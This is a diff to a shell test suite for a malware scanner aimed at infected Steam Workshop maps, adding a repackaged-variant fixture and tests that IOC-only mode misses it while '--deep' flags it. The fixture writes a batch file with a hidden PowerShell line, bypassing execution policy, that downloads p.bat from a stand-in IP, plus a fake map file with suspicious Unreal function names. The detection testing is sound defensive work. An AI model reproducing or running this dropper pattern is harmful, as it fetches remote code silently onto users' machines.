@@ -90,6 +90,32 @@ mkdir -p "$CLEAN/home/Documents" "$CLEAN/home/.config/autostart"
 printf 'a completely normal community map\n' \
     > "$CLEAN/steamroot/steamapps/workshop/content/$APPID/2222222222/nice.pak"
 
+# ------------------------------------------------------------- variant tree
+#
+# A repackaged copy of the same malware: different Workshop ID, different file
+# contents, different server. Every published indicator misses it. This is the
+# case --deep exists for, and the realistic one -- replacement maps appeared
+# within hours of each takedown.
+
+VAR="$FIX/variant"
+VWS="$VAR/steamroot/steamapps/workshop/content/$APPID/4242424242"
+mkdir -p "$VWS" "$VAR/home/Documents" "$VAR/home/.config/autostart"
+
+# Same dropper behaviour, none of the known strings.
+{
+    printf '@echo off\r\n'
+    printf 'if not defined _Q set _Q=1 ^& start /min cmd /c %%~f0 ^& exit\r\n'
+    printf 'powershell -w hidden -ep bypass -c iwr http://198.51.100.77/x/p.bat -OutFile %%TEMP%%\\p.bat\r\n'
+    printf 'echo inert test fixture\r\n'
+} > "$VAR/home/Documents/update_helper.bat"
+
+# A map reaching for capability it has no business having.
+{
+    printf 'PAKFILEHEADER\x00\x00'
+    printf 'GetPlatformUserDir'
+    printf '\x00\x00SaveStringToFile\x00\x00PADDING'
+} > "$VWS/newmap.pak"
+
 # ------------------------------------------------------------------ run them
 
 echo
@@ -149,6 +175,45 @@ bash "$SCANNER" --scan-root "$CLEAN" --indicators "$FIX/bad.json" --no-color >/d
 [ $? -eq 2 ] \
     && ok "exits 2 rather than reporting a false 'clean'" \
     || bad "exits 2 rather than reporting a false 'clean'"
+
+# --------------------------------------- repackaged variant, --deep vs not
+
+echo
+echo "  Repackaged variant (new ID, new hash, new server)"
+echo "  -------------------------------------------------"
+
+OUT_VAR_IOC="$(bash "$SCANNER" --scan-root "$VAR" --indicators "$REPO/indicators.json" --no-color 2>&1)"
+RC_VAR_IOC=$?
+OUT_VAR_DEEP="$(bash "$SCANNER" --deep --scan-root "$VAR" --indicators "$REPO/indicators.json" --no-color 2>&1)"
+RC_VAR_DEEP=$?
+
+# This is the honest limitation, asserted rather than hand-waved: without
+# --deep, a repackaged copy is invisible.
+echo "$OUT_VAR_IOC" | grep -qF "No known indicators of this malware were found" \
+    && ok "IOC-only mode misses the variant (documents the limitation)" \
+    || bad "IOC-only mode misses the variant (documents the limitation)"
+[ "$RC_VAR_IOC" -eq 0 ] \
+    && ok "IOC-only exits 0 on the variant"       || bad "IOC-only exits 0 on the variant (got $RC_VAR_IOC)"
+
+echo "$OUT_VAR_DEEP" | grep -qF "behaves like this malware" \
+    && ok "--deep catches the dropper pattern"    || bad "--deep catches the dropper pattern"
+echo "$OUT_VAR_DEEP" | grep -qF "launch programs, which maps do not need" \
+    && ok "--deep catches Unreal capability abuse" || bad "--deep catches Unreal capability abuse"
+echo "$OUT_VAR_DEEP" | grep -qF "worth a look" \
+    && ok "--deep wording avoids claiming infection" \
+    || bad "--deep wording avoids claiming infection"
+echo "$OUT_VAR_DEEP" | grep -qF "Do not panic" \
+    && ok "--deep tells the user most hits are false alarms" \
+    || bad "--deep tells the user most hits are false alarms"
+[ "$RC_VAR_DEEP" -eq 3 ] \
+    && ok "--deep exits 3 for behaviour-only hits" || bad "--deep exits 3 for behaviour-only hits (got $RC_VAR_DEEP)"
+
+# The clean tree must stay clean even in deep mode -- otherwise the flag is
+# useless noise.
+OUT_CLEAN_DEEP="$(bash "$SCANNER" --deep --scan-root "$CLEAN" --indicators "$REPO/indicators.json" --no-color 2>&1)"
+RC_CLEAN_DEEP=$?
+[ "$RC_CLEAN_DEEP" -eq 0 ] \
+    && ok "--deep stays quiet on a clean system"  || bad "--deep stays quiet on a clean system (got $RC_CLEAN_DEEP)"
 
 # ------------------------------------------- indicator parsing is exact
 #
